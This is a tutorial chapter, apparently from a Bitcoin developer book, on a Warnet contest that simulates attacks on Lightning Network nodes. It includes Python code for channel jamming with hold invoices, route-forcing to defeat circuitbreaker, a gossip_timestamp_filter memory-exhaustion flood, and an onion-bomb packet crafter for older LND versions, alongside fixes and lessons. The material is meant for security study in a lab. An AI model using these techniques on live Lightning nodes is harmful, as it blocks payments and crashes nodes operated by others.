# Part XI: Warnet: The Wrath of Nalo

## Chapter 18: A Practical Guide to Lightning Network Security Through Attack Simulation

### 18.1 Introduction

This chapter takes a sharp turn from wallet construction and on-chain Bitcoin into the **Lightning Network** — Bitcoin's second-layer payment system. Where previous chapters focused on building, this one focuses on **breaking**. Not out of malice, but because understanding how systems fail is the deepest way to understand how they work.

**The Wrath of Nalo** is an interactive attack contest built on [Warnet](https://github.com/bitcoin-dev-project/warnet), a Bitcoin network simulation framework. Teams of participants are given control of a small fleet of Bitcoin and Lightning nodes (an "armada") and tasked with executing real, documented attacks against designated target nodes.

> **Why study attacks?** Every vulnerability disclosed in this chapter was a real CVE that put real funds at risk on the live Lightning Network. Understanding them isn't academic — it's essential for anyone building or operating Lightning infrastructure.

By the end of this chapter, you will understand:

- How the **Lightning Network** layers on top of Bitcoin's UTXO model
- How **payment channels** and **HTLCs** work at the protocol level
- How **channel jamming** exploits the finite HTLC slot design
- How **circuitbreaker** attempts to mitigate jamming (and how it can still be defeated)
- How bugs in **gossip protocol handling** and **onion packet decoding** lead to node crashes
- How **Warnet** orchestrates all of this in a Kubernetes-based simulation

---

## 18.2 The Technology Stack

Before we attack anything, we need a mental model of the entire system. The Wrath of Nalo contest operates across **five distinct technology layers**, each building on the one below it.


**Key insight:** Each attack in this contest targets a different layer. Channel jamming operates at Layers 2–4. The gossip DoS targets Layer 3 (BOLT #7). The onion bomb targets Layer 3 (BOLT #4). But the *execution* of all attacks flows through Layer 5 (Warnet + Kubernetes).

---

## Chapter 19: Understanding Warnet

### 19.1 What Is Warnet?

Warnet is a framework that deploys **realistic Bitcoin and Lightning Network topologies** inside a Kubernetes cluster. Think of it as "Docker Compose for Bitcoin networks, at scale."

Each "node" in the network becomes a Kubernetes pod containing:


### 19.2 The Battlefield Architecture

The contest deploys a **multi-team network** where each team has:

1. **An Armada** (3 nodes you control) — your weapons
2. **Battlefield Nodes** (6 nodes you attack) — your targets
3. **Vulnerable Nodes** (2 nodes running old LND) — bonus targets

```mermaid
graph TB
    subgraph "Your Armada (wargames-cancer namespace)"
        A1[armada-1-ln<br/>🗡️ Sender]
        A2[armada-2-ln<br/>🗡️ Receiver]
        A3[armada-3-ln<br/>🗡️ CB Sender]
    end

    subgraph "Battlefield: Easy Path (default namespace)"
        SP[cancer-spender-ln<br/>💰 Sends 600 sat/5s]
        RT[cancer-router-ln<br/>🎯 TARGET]
        RC[cancer-recipient-ln<br/>💰 Receives]
        SP -->|channel| RT -->|channel| RC
    end

    subgraph "Battlefield: Hard Path (default namespace)"
        CBS[cancer-cb-spender-ln<br/>💰 Sends 600 sat/5s]
        CBR[cancer-cb-router-ln<br/>🎯 TARGET + Circuitbreaker]
        CBRC[cancer-cb-recipient-ln<br/>💰 Receives]
        CBS -->|channel + CB| CBR -->|channel + CB| CBRC
    end

    subgraph "Vulnerable Nodes (default namespace)"
        GV[cancer-gossip-vuln-ln<br/>💀 LND v0.18.2]
        OV[cancer-onion-vuln-ln<br/>💀 LND v0.16.4]
    end

    A1 ===|"channel: 5M sats"| RT
    A2 ===|"channel: 5M sats<br/>(push 2.5M)"| RT
    A3 ===|"channel: 5M sats"| CBS
    A2 ===|"channel: 5M sats<br/>(push 2.5M)"| CBRC

    style A1 fill:#bbdefb
    style A2 fill:#bbdefb
    style A3 fill:#bbdefb
    style RT fill:#ffcdd2
    style CBR fill:#ffcdd2
    style GV fill:#d1c4e9
    style OV fill:#d1c4e9
```



### 19.3 Warnet CLI — Your Command Interface

All interaction flows through the Warnet CLI, which translates your commands into Kubernetes API calls:

| Command | What It Does |
|---------|-------------|
| `warnet status` | Show all your pods and their state |
| `warnet ln rpc <node> <command>` | Execute an LND RPC command on a node |
| `warnet bitcoin rpc <node> <command>` | Execute a Bitcoin Core RPC command |
| `warnet run scenarios/<file>.py` | Deploy an attack scenario as a pod |
| `warnet stop` | Cancel running scenarios |
| `warnet dashboard` | Open Grafana + LN Visualizer |
| `warnet auth <kubeconfig>` | Switch cluster authentication |

> **Critical safety rule:** `warnet deploy` and `warnet down` will create or destroy infrastructure. On the live battlefield, you should **only** use `warnet run`, `warnet ln rpc`, `warnet bitcoin rpc`, `warnet status`, and `warnet stop`.

---

## Chapter 20: Lightning Channels and HTLCs — The Foundation

Before we can jam a channel, we need to understand what a channel *is* at the protocol level.

### 20.1 From UTXOs to Channels

A Lightning channel is a **2-of-2 multisig UTXO** on the Bitcoin blockchain. When two parties "open a channel," they co-sign a Bitcoin transaction that locks funds into this shared UTXO. They then exchange signed *commitment transactions* off-chain to update the balance between them.

```mermaid
sequenceDiagram
    participant A as armada-1
    participant Chain as Bitcoin Blockchain
    participant R as cancer-router

    A->>Chain: Funding TX (5M sats → 2-of-2 multisig)
    Note over Chain: Requires confirmations<br/>(~6 blocks on signet = ~6 min)
    Chain-->>A: Channel Active
    Chain-->>R: Channel Active

    Note over A,R: Off-chain: exchange commitment TXs
    A->>R: Commitment TX v1 (A: 4.999M, R: 0.001M)
    A->>R: Commitment TX v2 (A: 4.998M, R: 0.002M)
    Note over A,R: These never hit the blockchain<br/>unless the channel closes
```



### 20.2 What Is an HTLC?

An **HTLC (Hash Time-Locked Contract)** is the mechanism that makes multi-hop Lightning payments work. It's a conditional payment: "I'll pay you X sats *if* you reveal the preimage of this hash *before* this timeout."


**The critical limit:** Each Lightning channel can have at most **483 concurrent HTLCs** in each direction. This is a hard protocol limit defined in [BOLT #2](https://github.com/lightning/bolts/blob/master/02-peer-protocol.md). This limit is the foundation of the channel jamming attack.

### 20.3 Hold Invoices — The Weapon

A **hold invoice** (or hodl invoice) is the attacker's primary tool. Unlike a normal invoice where the receiver immediately reveals the preimage to settle the payment, a hold invoice **never reveals the preimage**. The HTLC stays pending indefinitely (until timeout, which can be hours).


Repeat this 483 times and the channel is **completely jammed** — no legitimate payment can pass through.

---

## Chapter 21: Phase 1 — Channel Jamming (The Easy Path)

### 21.1 The Objective

The battlefield has a payment circuit that runs automatically:

> Every 5 seconds, `cancer-spender-ln` sends a 600-sat keysend payment to `cancer-recipient-ln` through `cancer-router-ln`.

Our goal: **make those payments fail** by filling all HTLC slots on the router.

### 21.2 The Setup

Before attacking, we need to **insert ourselves into the payment topology**. This requires:

1. **Opening channels** from our armada to the target router
2. **Funding those channels** with enough sats to sustain hundreds of micro-payments
3. **Waiting for confirmations** (on signet, 1 block per ~60 seconds)


**Why `push_amt` on armada-2's channel?** When we open a channel, all the balance starts on our side (local). But our hold-invoice receiver (armada-2) needs the *router* to have outbound capacity toward it. By pushing 2.5M sats during channel open, we give the router liquidity to forward payments to armada-2.

### 21.3 Channel Opening Commands

```bash
# Open channel from armada-1 to the router (all local balance)
warnet ln rpc armada-1-ln openchannel \
  $ROUTER_PUBKEY \
  --connect cancer-router-ln.default \
  --local_amt=5000000

# Open channel from armada-2 with split liquidity
warnet ln rpc armada-2-ln openchannel \
  $ROUTER_PUBKEY \
  --connect cancer-router-ln.default \
  --local_amt=5000000 \
  --push_amt=2500000
```

### 21.4 The Attack Sequence

```mermaid
sequenceDiagram
    participant A1 as armada-1 (Sender)
    participant RT as cancer-router
    participant A2 as armada-2 (Receiver)

    loop 500 times (0.2s delay between threads)
        A2->>A2: Create hold invoice<br/>hash = random 32 bytes
        A2-->>A1: payment_request (BOLT11 invoice)
        A1->>RT: update_add_htlc #1..#483
        RT->>A2: update_add_htlc #1..#483
        Note over RT: ⚠️ HTLC slots filling up!
    end

    Note over RT: 🚫 483/483 slots used<br/>Channel JAMMED

    RT--xRT: cancer-spender payment arrives
    Note over RT: REJECT: too many pending HTLCs
```



### 21.5 The Code

The attack script (`ln_channel_jam.py`) uses the Commander base class provided by Warnet, which gives access to `self.lns` — a dictionary of all LN nodes the scenario can control:

```python
def send_one(index):
    # 1. Create a hold invoice on the receiver
    payment_hash = base64.b64encode(random.randbytes(32)).decode()
    response = self.lns[RECEIVER].post(
        "/v2/invoices/hodl",
        data={"value": AMT_SATS, "hash": payment_hash},
    )
    invoice = json.loads(response)["payment_request"]

    # 2. Pay from sender (fire-and-forget: HTLC stays pending)
    self.lns[SENDER].payinvoice(invoice)

# Launch 500 threads with 0.2s stagger
for i in range(500):
    threading.Thread(target=send_one, args=(i,)).start()
    sleep(0.2)
```

### 21.6 Verification

Success is confirmed when:

| Metric | Value | Meaning |
|--------|-------|---------|
| `armada-1 → router: pending_htlcs` | **483** | Channel 1 maxed |
| `armada-2 → router: pending_htlcs` | **483** | Channel 2 maxed |
| `cancer-spender: failed_payments` | Increasing | Legitimate payments blocked |

```bash
# Check from our side
warnet ln rpc armada-1-ln listchannels | python3 -c '
import sys,json; d=json.load(sys.stdin)
for c in d["channels"]:
    print(f"pending={len(c.get("pending_htlcs",[]))} active={c["active"]}")
'
```

---

## Chapter 22: Phase 2 — Defeating Circuitbreaker (The Hard Path)

### 22.1 What Is Circuitbreaker?

[Circuitbreaker](https://github.com/lightningequipment/circuitbreaker) is an LND plugin designed specifically to **mitigate channel jamming**. It acts as a firewall for HTLC forwarding:

```mermaid
graph LR
    subgraph "Normal LND"
        IN1[Incoming HTLC] -->|"forward"| OUT1[Outgoing HTLC]
    end

    subgraph "LND + Circuitbreaker"
        IN2[Incoming HTLC] --> CB{Circuitbreaker<br/>Rate Limiter}
        CB -->|"✅ Under limit"| OUT2[Forward HTLC]
        CB -->|"❌ Over limit"| FAIL[Reject HTLC<br/>MODE_FAIL]
    end

    style CB fill:#fff3e0
    style FAIL fill:#ffcdd2
```



Circuitbreaker enforces per-peer limits:

- **`maxPending`**: Maximum concurrent pending HTLCs from a single peer (set to **5** in this contest)
- **`maxHourlyRate`**: Maximum HTLCs per hour from a single peer (set to **0** = unlimited rate)
- **`mode`**: `MODE_FAIL` — immediately reject HTLCs that exceed limits

### 22.2 Why Simple Jamming Fails

If we naively try the Phase 1 approach against the CB path:

```
armada-3 → cb-spender → cb-router → cb-recipient
```

The 6th HTLC from any single peer gets **instantly rejected**. We can never fill all 483 slots.

### 22.3 The Strategy: Route Forcing

The trick is that we don't need to fill 483 slots. We only need to fill **5** — the `maxPending` limit. Once 5 HTLCs are pending from `cb-spender` to `cb-router`, circuitbreaker rejects ALL further forwards from `cb-spender`, including its legitimate 600-sat payments.

But there's a routing problem. We need our payments to flow through a very specific path:

```
armada-3 → cb-spender → cb-router → cb-recipient → armada-2
```

Without constraints, LND's pathfinder might choose a shorter route (e.g., `cb-spender → regular-router → armada-2`), completely bypassing the CB-protected path.

### 22.4 The Solution: `outgoing_chan_ids` + `last_hop_pubkey`

LND's `/v2/router/send` API provides two critical route-forcing parameters:


| Parameter | Purpose |
|-----------|---------|
| `outgoing_chan_ids` | Forces the payment to exit through a specific channel (armada-3 → cb-spender) |
| `last_hop_pubkey` | Forces the last intermediate node to be cb-recipient, ensuring the route goes through cb-router |

### 22.5 The Attack Sequence

```mermaid
sequenceDiagram
    participant A3 as armada-3
    participant CBS as cb-spender
    participant CBR as cb-router (CB)
    participant CBRC as cb-recipient
    participant A2 as armada-2

    Note over CBR: Circuitbreaker active<br/>maxPending=5 per peer

    loop 5 hold invoices
        A2->>A2: Create hold invoice
        A3->>CBS: HTLC (forced via outgoing_chan_ids)
        CBS->>CBR: Forward HTLC
        Note over CBR: CB check: pending from<br/>cb-spender = 1,2,3,4,5 ✅
        CBR->>CBRC: Forward HTLC
        CBRC->>A2: Forward HTLC
        Note over A2: Hold invoice: never settle ⏳
    end

    Note over CBR: 🚫 5/5 pending from cb-spender

    CBS->>CBR: Legitimate 600-sat keysend
    CBR--xCBS: REJECT (MODE_FAIL)<br/>maxPending exceeded!

    style CBR fill:#ffcdd2
```

### 22.6 The Code

```python
# Force route through CB path
resp = self.lns[SENDER].post(
    "/v2/router/send",
    data={
        "payment_request": pay_req,
        "fee_limit_sat": 2100000000,
        "timeout_seconds": 86400,
        "outgoing_chan_ids": [armada3_to_cbspender_chan],  # Force first hop
        "last_hop_pubkey": cb_recipient_pubkey_b64,        # Force path through cb-router
    },
    wait_for_completion=False,
)
```

### 22.7 Key Insight

> **You don't need to overwhelm circuitbreaker. You need to make it work against its own node.** By filling exactly `maxPending` slots with hold invoices, circuitbreaker faithfully blocks ALL further forwards from cb-spender — including the legitimate payments it's trying to protect.

---

## Chapter 23: Phase 3 — Gossip Timestamp Filter DoS

### 23.1 The Vulnerability (CVE in LND ≤ 0.18.2)

This attack shifts from the payment layer to the **gossip protocol layer** (BOLT #7). Lightning nodes maintain a local copy of the network graph, which they update via gossip messages from peers.

The `gossip_timestamp_filter` message (type 265) allows a node to request gossip updates from a peer, filtered by timestamp:

```
gossip_timestamp_filter:
  chain_hash:      32 bytes  (identifies the network)
  first_timestamp:  4 bytes  (show me gossip since this time)
  timestamp_range:  4 bytes  (for this duration)
```

### 23.2 The Bug

Prior to LND v0.18.3, when a node received a `gossip_timestamp_filter` request, it would:

1. **Load ALL matching gossip messages into memory at once**
2. Send them to the peer one-by-one, waiting for acknowledgment
3. Accept **unlimited concurrent requests** with no semaphore

```mermaid
graph TB
    subgraph "Attacker (20 connections)"
        C1[conn-0] & C2[conn-1] & C3[conn-...] & C4[conn-19]
    end

    subgraph "Victim (LND ≤ 0.18.2)"
        RECV[Receive gossip_timestamp_filter]
        RECV --> LOAD1[Load full graph<br/>into memory #1]
        RECV --> LOAD2[Load full graph<br/>into memory #2]
        RECV --> LOAD3[Load full graph<br/>into memory #...]
        RECV --> LOAD20[Load full graph<br/>into memory #20]

        LOAD1 --> MEM[Memory: 📈📈📈]
        LOAD2 --> MEM
        LOAD3 --> MEM
        LOAD20 --> MEM

        MEM --> OOM[💥 Out of Memory<br/>Process Killed]
    end

    C1 -->|"50 × gossip_timestamp_filter<br/>first_timestamp=0<br/>range=0xFFFFFFFF"| RECV
    C2 -->|"50 × ..."| RECV
    C3 -->|"50 × ..."| RECV
    C4 -->|"50 × ..."| RECV

    style OOM fill:#ffcdd2
```



### 23.3 The Attack: No Channels Needed

Unlike channel jamming, this attack doesn't require opening channels or spending any sats. It only requires a **raw p2p connection** to the victim:

```mermaid
sequenceDiagram
    participant ATK as Attacker
    participant V as Victim (LND ≤ 0.18.2)

    Note over ATK: Generate random private key
    ATK->>V: TCP connect to port 9735
    ATK->>V: Noise_XK handshake (encrypted transport)
    ATK->>V: init message (feature bits)
    V->>ATK: init message
    V->>ATK: query_channel_range (optional)

    loop 50 times per connection
        ATK->>V: gossip_timestamp_filter<br/>chain_hash=signet<br/>first_timestamp=0<br/>timestamp_range=0xFFFFFFFF
    end

    Note over ATK: Read responses VERY SLOWLY<br/>(forces LND to buffer in memory)

    loop keepalive
        ATK->>V: ping
        V->>ATK: pong
        Note over V: Memory growing... 📈
    end

    Note over V: 💥 OOM Crash
```



### 23.4 The P2P Connection

The attack uses `pyln-proto` — a Python implementation of the Lightning Network transport protocol — to establish an encrypted p2p connection and send arbitrary BOLT messages:

```python
from pyln.proto.wire import PrivateKey, PublicKey, connect

# Generate a throwaway identity
id_privkey = PrivateKey(random.randbytes(32))

# Establish encrypted p2p connection (Noise_XK handshake)
connection = connect(
    id_privkey,
    PublicKey(bytes.fromhex(victim_pubkey)),
    "cancer-gossip-vuln-ln.default",
    9735
)

# Complete the init handshake
send_msg(init_message)
recv_msg()  # victim's init

# Flood with gossip requests
for _ in range(50):
    send_msg(gossip_timestamp_filter(
        first_timestamp=0,           # From the beginning of time
        timestamp_range=0xFFFFFFFF   # Maximum range = full graph
    ))
```

### 23.5 The Fix (LND 0.18.3)

LND 0.18.3 added a **global semaphore** limiting concurrent `gossip_timestamp_filter` processing. While it doesn't reduce per-request memory usage, it caps the total memory impact.

---

## Chapter 24: Phase 4 — The Onion Bomb

### 24.1 The Vulnerability (LND < 0.17.0)

This attack targets the **onion routing layer** (BOLT #4). Every Lightning payment includes a 1,366-byte onion packet containing encrypted forwarding instructions for each hop.

### 24.2 How Onion Routing Works

```mermaid
graph LR
    subgraph "Onion Packet (1366 bytes)"
        V[Version<br/>1 byte]
        EK[Ephemeral Key<br/>33 bytes]
        RI[Routing Info<br/>1300 bytes]
        HMAC[HMAC<br/>32 bytes]
    end

    subgraph "Routing Info Structure"
        H1[Hop 1 Payload<br/>length | data | hmac]
        H2[Hop 2 Payload<br/>length | data | hmac]
        H3[Hop 3 Payload<br/>encrypted...]
        PAD[Padding...]
    end

    V --- EK --- RI --- HMAC
    RI --> H1 --> H2 --> H3 --> PAD
```

Each hop payload starts with a **BigSize length field** that tells LND how many bytes to allocate for the payload data.

### 24.3 The Bug

Prior to LND 0.17.0, the onion decoder **allocated memory based on this length field without bounds checking**:

```go
// VULNERABLE CODE (LND < 0.17.0)
payloadSize := uint32(varInt)          // Attacker controls this!
hp.Payload = make([]byte, payloadSize) // Allocates up to 4 GB!
```

By encoding `length = 0xFFFFFFFF` (4,294,967,295 bytes ≈ 4 GB), a single malicious onion packet forces LND to allocate ~4 GB of memory. Send several in parallel, and the node crashes instantly.

```mermaid
graph TB
    subgraph "Malicious Onion Packet"
        V2[0x00 Version]
        EK2[Random 33-byte Key]
        subgraph "Routing Info (1300 bytes)"
            LEN[BigSize Length:<br/>0xFE 0xFF 0xFF 0xFF 0xFF<br/>= 4,294,967,295 bytes]
            JUNK[Random padding...]
        end
        HMAC2[Random 32-byte HMAC]
    end

    LEN --> ALLOC["make([]byte, 4294967295)<br/>💥 Allocates 4 GB of RAM"]

    style LEN fill:#ffcdd2
    style ALLOC fill:#ffcdd2
```



### 24.4 The Attack: Crafting the Bomb

```python
def craft_onion_bomb():
    onion = bytearray(1366)

    onion[0] = 0x00                           # Version
    onion[1] = 0x02                           # Compressed pubkey prefix
    onion[2:34] = random.randbytes(32)        # Random ephemeral key

    # The bomb: BigSize encode UINT32_MAX
    onion[34] = 0xFE                          # BigSize prefix for 4-byte value
    struct.pack_into(">I", onion, 35, 0xFFFFFFFF)  # 4,294,967,295

    onion[39:1334] = random.randbytes(1295)   # Fill remaining routing info
    onion[1334:1366] = random.randbytes(32)   # Random HMAC

    return bytes(onion)
```

The bomb is delivered via a raw `update_add_htlc` message (type 128) sent over a p2p connection. LND decodes the onion **before** validating the HMAC, so the invalid HMAC doesn't prevent the allocation.

### 24.5 The Fix (LND 0.17.0)

The fix adds a bounds check that caps the maximum payload size at `UINT16_MAX` (65,535 bytes) — reducing the maximum allocation from 4 GB to 64 KB:

```go
// FIXED CODE (LND ≥ 0.17.0)
if varInt > math.MaxUint16 {
    return 0, fmt.Errorf("payload size %d exceeds maximum %d",
        varInt, math.MaxUint16)
}
return uint16(varInt), nil
```

### 24.6 Discovery Story

> This vulnerability was found in **less than a minute of fuzz testing**. A simple 10-line fuzz test that feeds random bytes to the onion decoder would have caught it before it was ever merged. — *Matt Morehouse*

---

## Chapter 25: The Execution Timeline

Here's how all four phases come together in a real attack session:


---

## Chapter 26: Dependencies and Prerequisites

Understanding what depends on what is crucial for troubleshooting:


> **Note:** Phases 3 and 4 are independent of channel setup — they only need the target's pubkey and hostname. They can be executed in parallel with or even before the channel jamming phases.

---

## Chapter 27: Lessons Learned

### 27.1 Operational Lessons

| Lesson | Context |
|--------|---------|
| **Know your environment** | The battlefield runs signet, not regtest. Deploying regtest configs to the remote cluster wiped all funded wallets (emptyDir volumes are ephemeral). |
| **Namespace matters** | Armada nodes live in `wargames-cancer`, battlefield nodes in `default`. Cross-namespace DNS requires the `.default` suffix. |
| **Push amounts create liquidity** | Without `--push_amt`, the router has no outbound capacity toward your receiver. Payments fail with "no route." |
| **Test locally first** | The local `regtest_jam` / `regtest_vuln` environments let you iterate quickly with instant blocks and full admin access. |
| **Don't use `--debug` for long-running attacks** | `--debug` streams logs to your terminal. If the terminal dies, the scenario pod gets killed. Omit `--debug` for attacks that need to persist. |

### 27.2 Security Lessons

| Vulnerability | Root Cause | Lesson |
|---------------|-----------|--------|
| **Channel Jamming** | Finite HTLC slots + no cost to hold them | Open research problem. No complete fix exists. Circuitbreaker is a mitigation, not a solution. |
| **Gossip DoS** | Unbounded memory allocation per gossip request, no concurrency limit | Always bound resource allocation. Add semaphores for concurrent request handling. |
| **Onion Bomb** | Missing bounds check on attacker-controlled length field | Validate all untrusted inputs. A 10-line fuzz test would have caught this bug. |
| **Circuitbreaker Bypass** | Per-peer limits can be saturated with exactly `maxPending` hold invoices | Rate limiting helps but doesn't eliminate jamming. The attacker only needs to match the limit, not overwhelm it. |

### 27.3 The Bigger Picture


---

## Glossary

| Term | Definition |
|------|-----------|
| **HTLC** | Hash Time-Locked Contract — a conditional payment that requires a secret (preimage) to claim |
| **Hold Invoice** | An invoice where the receiver intentionally never reveals the preimage, keeping the HTLC pending |
| **Channel Jamming** | Filling all HTLC slots on a channel with pending payments to block legitimate traffic |
| **Circuitbreaker** | An LND plugin that rate-limits HTLC forwarding per peer |
| **BOLT** | Basis of Lightning Technology — the specification documents for the Lightning Network protocol |
| **Gossip Protocol** | How Lightning nodes share and update their view of the network graph |
| **Onion Routing** | Multi-layer encryption ensuring each hop can only see its own forwarding instructions |
| **BigSize** | A variable-length integer encoding used in Lightning protocol messages |
| **Signet** | A Bitcoin testnet where only designated signers can produce blocks |
| **Warnet** | A framework for deploying realistic Bitcoin/LN networks in Kubernetes |
| **Commander** | Warnet's base class for attack scenarios, providing access to nodes via `self.lns` and `self.tanks` |
| **Armada** | The set of nodes controlled by a team in the Wrath of Nalo contest |
| **`pyln-proto`** | A Python library implementing the Lightning Network p2p transport and message encoding |
| **OOM** | Out of Memory — when a process exhausts available RAM and is killed by the OS |
| **Push Amount** | Sats transferred to the remote side during channel opening, creating initial remote balance |

---

## References

1. **Warnet Framework** — [github.com/bitcoin-dev-project/warnet](https://github.com/bitcoin-dev-project/warnet)
2. **Channel Jamming Attacks** — [bitcoinops.org/en/topics/channel-jamming-attacks](https://bitcoinops.org/en/topics/channel-jamming-attacks/)
3. **Hold Invoices** — [bitcoinops.org/en/topics/hold-invoices](https://bitcoinops.org/en/topics/hold-invoices/)
4. **Circuitbreaker** — [github.com/lightningequipment/circuitbreaker](https://github.com/lightningequipment/circuitbreaker)
5. **LND Gossip Timestamp Filter DoS** — [morehouse.github.io/lightning/lnd-gossip-timestamp-filter-dos](https://morehouse.github.io/lightning/lnd-gossip-timestamp-filter-dos/)
6. **LND Onion Bomb** — [morehouse.github.io/lightning/lnd-onion-bomb](https://morehouse.github.io/lightning/lnd-onion-bomb/)
7. **BOLT Specifications** — [github.com/lightning/bolts](https://github.com/lightning/bolts)
8. **Lightning Network Book** — [github.com/lnbook/lnbook](https://github.com/lnbook/lnbook)
